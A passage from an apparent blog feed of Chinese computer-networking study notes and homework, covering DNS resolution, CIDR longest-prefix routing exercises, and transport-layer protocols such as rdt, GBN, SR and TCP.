src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211112307874_994_20221120100010926561_580_image-20221115222340231.png" alt="image-20221115222340231" style="zoom: 67%;"></p><p>1.2.首先查本地缓存，如果没有记录，则以DNS客户的身份向根域名服务器发出解析请求(2)，如果有直接将IP地址返回请求主机(实验操作中的情况，对应图中的8)</p><p>3.根域名服务器收到请求后，判断该域名属于.com域，将对应的TLD(顶级域名服务器，此处为.com)的IP地址返回给本地域名服务器。4.本地域名服务器再次请求</p><p>5.TLD收到请求后，判断该域名属于baidu.com域，因此将对应的授权域名服务器baidu.com的IP地址返回给本地域名服务器。</p><p>6.向百度的顶级域名服务器baidu.com.请求www.baidu.com。</p><p>7.返回ip地址</p><p>8.本地域名服务器把结果返回客户机并缓存</p><p>当然对于百度这个例子，它发现这个www有别名叫www.a.shifen.com。</p><p>拿到www.baidu.com的别名www.a.shifen.com的时候，本来要重新到com域查找shifen.com的NS，又因为，两个域在同一台NS上，所以直接向本机(授权域名服务器)发起了shifen.com域的查找请求，把a.shifen.com的IP返回。</p><h6 id="section-2">3.</h6><p>在DNS域名系统中，域名解析时使用UDP协议提供的传输层服务（DNS服务器使用UDP的53端口），而UDP提供的是不可靠的传输层服务，请你解释DNS协议应如何保证可靠机制。</p><p>首先，查阅了解了为什么DNS使用UDP:其实感性上就可以理解，DNS并不需要TCP所提供的全部可靠性机制，而TCP会相比UDP耗费更多的资源。当然，其实DNS在设计之初就在区域传输中引入了 TCP 协议的可选项。</p><p>关于如何保证可靠性，主要有以下几个方面:</p><p>从DNS应用层本身来说，首先报文中问题的数量、回答的数量，就可以可以用来进行一定的校验，同时DNS也是有生存周期的，在生命周期过后会进行重新请求更新以保证数据的正确性。</p><p>从可用性上来说，DNS的权威服务器也是冗余支持的。</p><p>从安全性上来说，DNS脆弱性主要有两个可能的方面:一是课本中提到的DDoS攻击，当然由于缓存机制的存在很难造成实质性的危害;另外更常见的是针对缓存进行欺骗的所谓投毒攻击，现在也有DNS安全扩展 (<a href="https://cloud.google.com/dns/docs/dnssec?hl=zh-cn">DNSSEC</a>)对其进行保护。</p><p>当然以上几个方面和TCP从协议层面上保证的可靠性肯定不能等同而论，但足以满足实际应用是需求。</p><blockquote><p>答案就写了超时重传和差错检测，大概其实是想问如果要实现可靠机制需要增加哪些机制吧。</p></blockquote><h6 id="捎带复习一下域名格式压缩">捎带复习一下域名格式压缩</h6><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211113362069_658_20221120100012567584_212_image-20221115230206425.png" alt="image-20221115230206425"><figcaption aria-hidden="true">image-20221115230206425</figcaption></figure><p>"11"指字节的前两位</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211114836606_350_20221120100014215164_756_image-20221115230406295.png" alt="image-20221115230406295"><figcaption aria-hidden="true">image-20221115230406295</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络-书面作业2</title>
    <link href="/posts/55151/"/>
    <url>/posts/55151/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络-书面作业2">计算机网络-书面作业2</h1><p>下表是一个使用CIDR（无类域间路由）的路由表，为了计算方便，IP地址使用十六进制表示。针对下面每个目的地址给出路由器所选择的下一步跳的标号，即A、B、C、D和E，并给出计算过程。</p><ol type="1"><li><p>C4.5E.13.87</p></li><li><p>C4.5E.22.09</p></li><li><p>C3.41.80.02</p></li><li><p>5E.43.91.12</p></li><li><p>C4.6D.31.2E</p></li><li><p>C4.6B.31.2E</p></li></ol><table><thead><tr class="header"><th>网络地址/前缀长度</th><th><strong>下一步跳</strong></th></tr></thead><tbody><tr class="odd"><td>C4.50.0.0/12</td><td>A</td></tr><tr class="even"><td>C4.5E.10.0/20</td><td>B</td></tr><tr class="odd"><td>C4.60.0.0/12</td><td>C</td></tr><tr class="even"><td>C4.68.0.0/14</td><td>D</td></tr><tr class="odd"><td>0.0.0.0</td><td>E</td></tr></tbody></table><p>首先方便最长匹配,将路由表重新排序:</p><table><thead><tr class="header"><th>网络地址/前缀长度</th><th><strong>下一步跳</strong></th></tr></thead><tbody><tr class="odd"><td>C4.5E.10.0/20</td><td>B</td></tr><tr class="even"><td>C4.68.0.0/14</td><td>D</td></tr><tr class="odd"><td>C4.60.0.0/12</td><td>C</td></tr><tr class="even"><td>C4.50.0.0/12</td><td>A</td></tr><tr class="odd"><td>0.0.0.0</td><td>E</td></tr></tbody></table><ol type="1"><li><p>C4.5E.13.87 前20位和第一条路由匹配，下一跳是B</p></li><li><p>C4.5E.22.09前20位和第一条路由不匹配，但与第四条路由前12位匹配，下一跳是A</p></li><li><p>C3.41.80.02 前四条路由都不匹配，选择默认路由 0.0.0.0，下一跳是E</p></li><li><p>5E.43.91.12 和(3)类似，下一跳是E</p></li><li><p>C4.6D.31.2E8是1000，D是1101，对于第二条路由第14位不匹配，因此只能匹配第三条路由，下一跳是C</p></li><li><p>C4.6B.31.2E8是1000，B是1011，前十四位与第二条路由匹配，下一跳是D</p></li></ol><p>事实上，为了更加有效地查找最长前缀匹配，通常将无分类编址的路由表存放在一种层次式数据结构中，然后自上而下地按层次进行查找。这里最常用的数据结构就是二叉线索。所以以2为例真实的查找方式是发现C4.50.0.0/12 匹配，查看孩子节点是否匹配，发现没有匹配的，则下一跳为A</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>寄网-传输层</title>
    <link href="/posts/6389/"/>
    <url>/posts/6389/</url>
    
    <content type="html"><![CDATA[<h1 id="寄网-传输层">寄网-传输层</h1><h2 id="udp">UDP</h2><h3 id="特点">特点</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210157758684_494_20221102112829451012_857_image-20221019101254797.png" alt="image-20221019101254797"><figcaption aria-hidden="true">image-20221019101254797</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210159265810_142_20221102112833830874_553_image-20221019102904831.png" alt="image-20221019102904831"><figcaption aria-hidden="true">image-20221019102904831</figcaption></figure><blockquote><p>D</p></blockquote><h3 id="复用分用">复用分用</h3><div class="note note-info">如何理解复用和分用？</div><p>复用就是多个应用层进程汇聚成一个传输层进程（八车道变一车道）</p><p>分用就是反过来，传输层的多个进程相应的通向多个应用层进程（单车道变八车道）</p><p>通常复用针对发送，分用针对接收。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210200319520_306_20221102112836012813_910_image-20221019101337529.png" alt="image-20221019101337529"><figcaption aria-hidden="true">image-20221019101337529</figcaption></figure><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210201761353_804_20221102112841055514_461_image-20221019104559718.png" alt="image-20221019104559718"> &gt; B</p><h3 id="报文结构和校验">报文结构和校验</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210202885968_763_20221102112842251316_209_image-20221019102648654.png" alt="image-20221019102648654"><figcaption aria-hidden="true">image-20221019102648654</figcaption></figure><p><font color="Apricot">算校验和的时候别忘了进位</font></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210206252548_468_20221102112844925605_254_image-20221019101834126.png" alt="image-20221019101834126"><figcaption aria-hidden="true">image-20221019101834126</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210207702071_809_20221102112847899571_967_image-20221019102038599.png" alt="image-20221019102038599"><figcaption aria-hidden="true">image-20221019102038599</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210209127950_658_20221102112851148719_202_image-20221019101153691.png" alt="image-20221019101153691"><figcaption aria-hidden="true">image-20221019101153691</figcaption></figure><blockquote><p>B：长度包含头部，但不包含伪首部</p></blockquote><p>最重要的“为什么”部分：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210210186747_533_20221102112852360163_657_image-20221019102522221.png" alt="image-20221019102522221"><figcaption aria-hidden="true">image-20221019102522221</figcaption></figure><h3 id="应用">应用</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210211518101_390_20221102112854071267_984_image-20221019103901732.png" alt="image-20221019103901732"><figcaption aria-hidden="true">image-20221019103901732</figcaption></figure><h2 id="可靠数据传输">可靠数据传输</h2><h3 id="目标">目标</h3><p>左边是希望对上层达到的抽象，右边是实际的情况。<img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210212743134_565_20221102112856140137_289_image-20221019161257579.png" alt="image-20221019161257579"></p><h3 id="设计思路">设计思路</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210214194976_298_20221102112857352548_948_image-20221019162323429.png" alt="image-20221019162323429"><figcaption aria-hidden="true">image-20221019162323429</figcaption></figure><h4 id="rdt1.0">rdt1.0</h4><p>考虑最简单的情况，即底层信道是完全可靠的：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210215423897_929_20221102112900136029_437_image-20221019162337067.png" alt="image-20221019162337067"><figcaption aria-hidden="true">image-20221019162337067</figcaption></figure><p>发送端：打包数据，直接调用底层信道进行传输；</p><p>接收端：拆包，将数据交给上层应用</p><h4 id="rdt2.0">rdt2.0</h4><p>下层通道可能造成某些位出现错误（如:1变0，0变1)</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210216697485_473_20221102112902564743_320_image-20221019163254576.png" alt="image-20221019163254576"><figcaption aria-hidden="true">image-20221019163254576</figcaption></figure><p class="note note-secondary">缩写：ACKnowledge character；Not AcKnowledge character肯定确认和否定确认。 同时为简便直白，对于package的翻译，用包代替分组</p><h5 id="发送端">发送端：</h5><p>仅当接收到ACK并离开该状态时才能发生rdt_send()事件。因此，在发送方确信接收方已正确接收当前分组之前肯定不会发送新数据。由于这种行为，rdt2.0这样的协议被称为停等(stop-and-wait)协议。</p><h5 id="接收端">接收端：</h5><p>上面表示如果packet受损发送NAK，下面表示如果package正确向上层传送数据并发送ACK</p><h5 id="存在的问题">存在的问题：</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210220358453_867_20221102112906743219_237_image-20221019164147811.png" alt="image-20221019164147811"><figcaption aria-hidden="true">image-20221019164147811</figcaption></figure><h4 id="rdt2.1">rdt2.1</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210221503147_107_20221102112909502820_948_image-20221019165240189.png" alt="image-20221019165240189"><figcaption aria-hidden="true">image-20221019165240189</figcaption></figure><p>答案是只需要1bit。因为如果发送端交替发送01包，接收端只需要知道收到的包是最近收到的(序号没变)还是新的(序号变了)。</p><p>按照这样的思路状态机如下：</p><p>发送端就是每当收到正确且是ACK的包的时候就准备发下一个，否则收到的是受损包或NAK就重发。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210222750499_102_20221102112911602268_247_image-20221019170813474.png" alt="image-20221019170813474"><figcaption aria-hidden="true">image-20221019170813474</figcaption></figure><p>接收端：等待接受状态上面部分是发现包受损发NAK且等待，发现和上一次收到的包重复就发ACK(以让发送端发下一个包)，然后等待，也是什么也不做，不向下层传输信息(丢数据)</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210223884558_833_20221102112913795898_163_image-20221019171058350.png" alt="image-20221019171058350"><figcaption aria-hidden="true">image-20221019171058350</figcaption></figure><p>还有，接受端收到受损包其实不需要发NAK，再发一次上一次正确接收的ACK，发送端发现收到了对同一个包的两个ACK就知道接收端没正确接收这个包。</p><p>这其实就是rdt2.2</p><h4 id="rdt2.2">rdt2.2</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210225249292_703_20221102112917959019_890_image-20221019171614203.png" alt="image-20221019171614203"><figcaption aria-hidden="true">image-20221019171614203</figcaption></figure><p>在前面的基础上，看懂这种情况下的状态机就不再困难了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210226309404_749_20221102112919789535_361_image-20221019183702448.png" alt="image-20221019183702448"><figcaption aria-hidden="true">image-20221019183702448</figcaption></figure><p>接收端的主要变化是：在ACk中添加最后收到的包的序列和号，对应<code>make_pkt</code>第二个参数。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210228179719_902_20221102112923670147_103_image-20221019184436444.png" alt="image-20221019184436444"><figcaption aria-hidden="true">image-20221019184436444</figcaption></figure><h4 id="rdt3.0">rdt3.0</h4><h5 id="方案">方案：</h5><p>解决的问题：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210229596705_545_20221102112929819897_715_image-20221019185155113.png" alt="image-20221019185155113"><figcaption aria-hidden="true">image-20221019185155113</figcaption></figure><p>添加了计时器的发送端：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210231463399_658_20221102112931855615_706_image-20221019185225064.png" alt="image-20221019185225064"><figcaption aria-hidden="true">image-20221019185225064</figcaption></figure><p>接收端不需要改变。因为在2.3中已经实现了判断重复并丢弃了。</p><h5 id="实例">实例</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210232766290_806_20221102112933551292_417_image-20221019185429262.png" alt="image-20221019185429262"><figcaption aria-hidden="true">image-20221019185429262</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210233916080_286_20221102112937343229_422_image-20221019185440433.png" alt="image-20221019185440433"><figcaption aria-hidden="true">image-20221019185440433</figcaption></figure><p class="note note-primary">失序问题(二义性)是不能解决的，如下图所示</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210235178490_197_20221102112939258493_256_image-20221026092203952.png" alt="image-20221026092203952" width="67%" height="67%"></p><p>如果是上述情况，接收端不能辨别是重传的pkt1还是想要的pkt1.</p><p class="note note-primary">怎么解决？wifi用的是停等协议(和rdt3.0一样)，加入标志位表明是否是重传的包。如果接收端发现是接受过的，丢弃。但对于tcp性能优化后，就需要增加序号字段宽度</p><h3 id="流水线可靠数据传输">流水线可靠数据传输</h3><h4 id="停等协议的性能问题">停等协议的性能问题</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210236606641_276_20221102112941284045_123_image-20221019185844985.png" alt="image-20221019185844985"><figcaption aria-hidden="true">image-20221019185844985</figcaption></figure><p>发送时间相比传输时间是极短的</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210237714669_996_20221102112942732666_577_image-20221019185852269.png" alt="image-20221019185852269"><figcaption aria-hidden="true">image-20221019185852269</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210241006358_952_20221102112946369564_281_image-20221019185917983.png" alt="image-20221019185917983"><figcaption aria-hidden="true">image-20221019185917983</figcaption></figure><h4 id="流水线协议">流水线协议</h4><h5 id="go-back-ngbn">Go-Back-N(GBN)</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210242352943_108_20221102112949459658_238_image-20221019190539995.png" alt="image-20221019190539995"><figcaption aria-hidden="true">image-20221019190539995</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210243518309_802_20221102112952032314_240_image-20221019190656995.png" alt="image-20221019190656995"><figcaption aria-hidden="true">image-20221019190656995</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210245072105_715_20221102112956234191_425_image-20221019190714367.png" alt="image-20221019190714367"><figcaption aria-hidden="true">image-20221019190714367</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210246172681_424_20221102113000887288_715_image-20221019190525409.png" alt="image-20221019190525409"><figcaption aria-hidden="true">image-20221019190525409</figcaption></figure><p>GBN协议看起来很浪费，因为它会丢弃一个正确接收（但失序）的包。但这样做是有道理的。因为数据必须按序交付。接收方可能缓存包n + 1，但是，根据 GBN 重传规则，如果包 n 丢失，则这个包及第n +1及之后的包迟早会再重传，所以，接收方只需要直接丢弃第n + 1个包即可。</p><p>这种方法的优点是<strong>接收方不需要缓存任何失序分组</strong>，<strong>唯一需要维护的信息就是下一个按序接收的分组的序号</strong>。缺点就是<strong>随后对该分组的重传也许会丢失或出错，进而引发更多的重传。</strong></p><h5 id="sr">SR</h5><p>与GBN的主要区别：</p><ul><li><p>发送端：</p><ul><li><p>每个分组必须拥有其自己的逻辑定时器，因为超时发生后只能发送一个包。</p></li><li><p>记录收到的ACK(因为不再重复发送)，但仅当收到的ACK的序号等于基序号<code>base</code>时窗口才会移动，移动到最小的未确认分组处(接收到的最大ACK+1)</p></li></ul></li><li><p>接收端</p><ul><li><p>收到没收到过的包，在窗口口内，缓存并发ACK这个包的序号。(没收到的包在窗口外那肯定是接收端缓存放不下了)</p></li><li><p>收到已经收到过的包，也发这个包的ACK。</p></li></ul></li></ul><p class="note note-primary">第二种情况是什么情景？收到已经收到过的包，那么只有一种情况，那就是接收端的ACK丢失，发送端不知道接收端这个包已经接受了，认为是中途丢了，就会再发一次。为什么要返回 ACK？加入按照上图中所示的发送方和接收方的序号空间，如果分组 send_base 的 ACK没有从接收方传播回发送方，则发送方最终将重传分组send_base，即使显然接收方已经收了该分组。如果接收方不确认该分组，则发送方窗口将永远不能向前滑动。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210248714116_152_20221102113003951000_939_image-20221026102125865.png" alt="image-20221026102125865"><figcaption aria-hidden="true">image-20221026102125865</figcaption></figure><p>然而，SR还是没解决类似的失序问题(虽然产生原因不一样，但导致的后果是一样的，即二义性)</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210250133679_768_20221102113005960023_920_image-20221026102907586.png" alt="image-20221026102907586"><figcaption aria-hidden="true">image-20221026102907586</figcaption></figure><p>我们能够直观的感觉到，只要<strong>序号空间应大于等于窗口大小的2倍</strong>，就能“错开”潜在的二义性区间。</p><h3 id="tcp">TCP</h3><h4 id="段格式">段格式</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210251523006_419_20221102113010320175_456_image-20221028201125789.png" alt="image-20221028201125789"><figcaption aria-hidden="true">image-20221028201125789</figcaption></figure><p class="note note-info">报头长度为20~60B，其中固定部分为20B。由于数据偏移字段的单位是4B，也就是说当偏移取最大时TCP首部长度为15×4=60B。</p><h4 id="连接管理">连接管理</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210252765508_376_20221102113012417879_161_image-20221028202938399.png" alt="image-20221028202938399"><figcaption aria-hidden="true">image-20221028202938399</figcaption></figure><blockquote><p>B</p></blockquote><p>关于连接的建立和释放(三次握手，四次挥手)等内容，在实验作业中有详细的阐述。</p><p><a target="_blank" href="https://lunaticsky-tql.github.io/posts/13596/" style="position: relative; display: -webkit-box; display: -webkit-flex; display: -ms-flexbox; display: flex; box-sizing: border-box; -webkit-flex-direction: row; -ms-flex-direction: row; flex-direction: row; -webkit-align-items: center; -webkit-box-align: center; -ms-flex-align: center; align-items: center; width: 390px; min-height: 84px; border-radius: 8px; max-width: 100%; overflow: hidden; margin: 16px auto; padding: 12px 12px 9px 12px; background-color: #F6F6F6;"><span class="LinkCard-contents"><span style="display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; text-overflow: ellipsis; max-height: 40px; line-height: 1.25; color: #121212;">Wireshark分析交互过程</span><span style="display: -webkit-box; font-size: 13px; height: 18px; line-height: 18px; color: #999; word-break: break-all; text-overflow: ellipsis; overflow: hidden; -webkit-line-clamp: 1; -webkit-box-orient: vertical;"><span style="display: inline-flex; align-items: center;"><svg class="Zi Zi--InsertLink" fill="currentColor" viewBox="0 0 24 24" width="14" height="14"><path d="M13.414 4.222a4.5 4.5 0 1 1 6.364 6.364l-3.005 3.005a.5.5 0 0 1-.707 0l-.707-.707a.5.5 0 0 1 0-.707l3.005-3.005a2.5 2.5 0 1 0-3.536-3.536l-3.005 3.005a.5.5 0 0 1-.707 0l-.707-.707a.5.5 0 0 1 0-.707l3.005-3.005zm-6.187 6.187a.5.5 0 0 1 .638-.058l.07.058.706.707a.5.5 0 0 1 .058.638l-.058.07-3.005 3.004a2.5 2.5 0 0 0 3.405 3.658l.13-.122 3.006-3.005a.5.5 0 0 1 .638-.058l.069.058.707.707a.5.5 0 0 1 .058.638l-.058.069-3.005 3.005a4.5 4.5 0 0 1-6.524-6.196l.16-.168 3.005-3.005zm8.132-3.182a.25.25 0 0 1 .353 0l1.061 1.06a.25.25 0 0 1 0 .354l-8.132 8.132a.25.25 0 0 1-.353 0l-1.061-1.06a.25.25 0 0 1 0-.354l8.132-8.132z"></path></svg></span><span>https://lunaticsky-tql.github.io/posts/13596/</span></span></span></a></p><h4 id="传输过程">传输过程</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210257648366_404_20221102113015046715_418_image-20221028202640029.png" alt="image-20221028202640029"><figcaption aria-hidden="true">image-20221028202640029</figcaption></figure><p>对于某一端来说，seq表示发送的报文段中数据部分的第一个字节在其发送缓存区中的编号，<font color="Apricot">ack表示它期望收到的下一个报文段的数据部分的第一个字节在另一端的发送缓存区中的编号</font>。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210259152645_216_20221102113021254308_149_image-20221028202202650.png" alt="image-20221028202202650"><figcaption aria-hidden="true">image-20221028202202650</figcaption></figure><blockquote><p>同一个TCP报文中的seq和ack的值是没有联系。在B发给A的报文（捎带确认）中，seq值应和A发向B的报文中的ack值相同，即201：ack值表示B期望下次收到A发出的报文段的第一个字节的编号，应是200+2=202。</p></blockquote><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210300169798_848_20221102113022900814_335_image-20221028203537641.png" alt="image-20221028203537641"><figcaption aria-hidden="true">image-20221028203537641</figcaption></figure><blockquote><p>D</p></blockquote><h4 id="重传场景">重传场景</h4><h5 id="超时重传">超时重传</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210302309377_877_20221102113025521130_952_image-20221102090515967.png" alt="image-20221102090515967"><figcaption aria-hidden="true">image-20221102090515967</figcaption></figure><h6 id="rto设置重要性">RTO设置重要性</h6><p>RTO设置过大，对于丢失的报文段重传等待的时间过长，对于应用来说会引入较大的时延</p><p>RTO设置过小，可能会提前超时，引入不必要的重传，浪费带宽资源</p><h6 id="算法思路">算法思路</h6><p>最新样本赋予的权值大于老样本的权值（老化算法）</p><p>越新的样本越能更好地反映网络的当前状况</p><p>不仅如此，在实际情况中，网络拥塞情况会对网络时延有很大影响(体现在下面的DevRTT中)</p><p>启发式算法：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210303503113_832_20221102113027424562_662_image-20221102090928397.png" alt="image-20221102090928397"><figcaption aria-hidden="true">image-20221102090928397</figcaption></figure><h5 id="快速重传">快速重传</h5><p>“事不过三”。如果收到重复ACK，至少说明客户端接收到的包失序了。如果一两个，可能只是包跑的不一样快，但多了就认为很有可能是丢了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210304660072_706_20221102113029523742_128_image-20221102091321589.png" alt="image-20221102091321589"><figcaption aria-hidden="true">image-20221102091321589</figcaption></figure><h4 id="流量控制">流量控制</h4><h5 id="滑动窗口">滑动窗口</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210305919935_520_20221102113031785988_286_image-20221102102355905.png" alt="image-20221102102355905"><figcaption aria-hidden="true">image-20221102102355905</figcaption></figure><p class="note note-primary">如果上图中黄×所在的ACK没收到咋办？会出现什么情况？如何解决？</p><p>服务器不知道</p><blockquote><p>TCP使用滑动窗口机制来进行流量控制，其窗口尺寸的设置很重要，如果滑动窗口值设置得太小，那么会产生过多的ACK(因为窗口大可以累积确认，因此会有更少的ACK)，影响网络吞吐率；如果设置得太大，那么又会由于传送的数据过多而使路由器变得拥挤，浪费主机的存储资源，导致主机可能丢失分组。</p></blockquote><h5 id="性能问题image-20221102100002266">性能问题<img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%AF%84%E7%BD%91-%E4%BC%A0%E8%BE%93%E5%B1%82/20230828210307285438_328_20221102113034340991_595_image-20221102100002266.png" alt="image-20221102100002266"></h5>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>寄网-应用层</title>
    <link href="/posts/31769/"/>
    <url>/posts/31769/</url>
    
